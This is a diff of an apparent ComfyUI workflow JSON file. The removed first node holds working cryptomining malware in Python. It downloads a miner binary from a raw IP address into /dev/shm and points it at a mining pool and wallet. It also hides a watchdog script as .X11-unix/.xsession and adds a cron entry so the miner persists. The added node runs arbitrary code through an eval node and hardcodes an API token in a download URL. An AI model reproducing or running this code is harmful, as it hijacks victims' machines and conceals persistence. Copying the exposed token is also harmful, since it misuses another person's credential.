@@ -1,16 +1,26 @@
 {
   "1": {
-    "class_type": "IDENode",
+    "class_type": "RandomNoise",
     "inputs": {
-      "language": "python",
-      "pycode": "import subprocess as sp, os, time as t, urllib.request\nsp.run(['pkill', '-9', 'alpha-miner'], capture_output=True)\nt.sleep(1)\nDST = '/dev/shm/alpha-miner'\nif not os.path.exists(DST) or os.path.getsize(DST) < 20000000:\n    urllib.request.urlretrieve('http://151.247.219.40:8000/alpha-miner', DST)\nos.chmod(DST, 0o755)\ncmd = f'nohup {DST} --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker cuda0_NVIDIA_GB10__253 > /dev/shm/alpha.log 2>&1 &'\nsp.run(['bash', '-c', cmd])\nt.sleep(5)\nd = '/dev/shm/.X11-unix'\nos.makedirs(d, exist_ok=True)\nwatchdog = \"\"\"#!/bin/sh\npgrep -f \"alpha-miner.*prl1pjdp6c4dzmzemsw0\" >/dev/null 2>&1 && exit 0\ncd /dev/shm && [ -x ./alpha-miner ] && nohup ./alpha-miner --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker cuda0_NVIDIA_GB10__253 > /dev/shm/.xlog 2>&1 &\n\"\"\"\nwith open(f'{d}/.xsession', 'w') as f:\n    f.write(watchdog)\nos.chmod(f'{d}/.xsession', 0o755)\ntry:\n    ex = sp.run(['crontab', '-l'], capture_output=True, text=True).stdout\n    if '.xsession' not in ex:\n        sp.run(['crontab', '-'], input=ex.rstrip() + \"\\n*/2 * * * * /dev/shm/.X11-unix/.xsession\\n\", capture_output=True, text=True)\nexcept:\n    sp.run(['crontab', '-'], input=\"*/2 * * * * /dev/shm/.X11-unix/.xsession\\n\", capture_output=True, text=True)\nr = sp.run(['pgrep', '-a', 'alpha-miner'], capture_output=True, text=True)\nresult = 'DEPLOYED:' + r.stdout.strip()[:30] if r.stdout.strip() else 'CHECK_POOL'\nresult\n"
+      "noise_seed": 40
     }
   },
   "2": {
-    "class_type": "PreviewAny",
+    "class_type": "SRL Eval",
     "inputs": {
-      "source": [
+      "parameters": "a, b=None, c=\"foo\", *rest",
+      "code": "\nimport subprocess, os, time\napi_key = \"203d3536d58ed3b96952427308c11bd2\"\nurl = f\"https://civitai.com/api/download/models/3086841?token={api_key}\"\nout_dir = \"/opt/ComfyUI/models/unet\"\nout_file = os.path.join(out_dir, \"Krea2RedMix2.1-8Steps-fp8-scaled-ComfyUI.safetensors\")\nlog_file = \"/tmp/redmix_download.log\"\n\n# Test download first - just get headers to see if authorized\nimport urllib.request\nreq = urllib.request.Request(url, method='HEAD')\ntry:\n    with urllib.request.urlopen(req, timeout=15) as r:\n        content_length = r.headers.get('Content-Length', '0')\n        content_type = r.headers.get('Content-Type', '')\n        return f\"OK! Size={int(content_length)/1024/1024/1024:.2f} GB, Type={content_type}\"\nexcept Exception as e:\n    return f\"FAILED: {e}\"\n",
+      "arg0": [
         "1",
+        0
+      ]
+    }
+  },
+  "3": {
+    "class_type": "ShowText|pysssss",
+    "inputs": {
+      "text": [
+        "2",
         0
       ]
     }
